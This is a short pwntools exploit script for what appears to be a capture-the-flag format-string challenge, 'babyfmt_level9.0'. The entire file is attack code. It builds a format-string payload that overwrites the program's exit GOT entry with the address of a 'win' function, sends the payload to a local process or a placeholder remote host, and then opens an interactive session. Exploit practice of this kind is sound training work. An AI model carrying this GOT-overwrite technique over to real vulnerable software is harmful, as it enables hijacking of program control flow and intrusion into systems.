#!/usr/bin/env python3

from pwn import *

exe = ELF("./babyfmt_level9.0")

context.binary = exe

gdb_script = """
b *main
b *func+346
c
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    else:
        r = remote("addr", 1337)

    return r

win_addr = 0x401500
exit_got = 0x404078
offset = 35
def main():
    r = conn()

    # good luck pwning :)
    payload = b'A' * 3
    payload += fmtstr_payload(offset, {exit_got: win_addr}, write_size='short', numbwritten=40)
    r.send(payload)
    r.interactive()


if __name__ == "__main__":
    main()


# 0x404078 => exit got entry
# 0x401500 => win address
# allready printed bytes 37
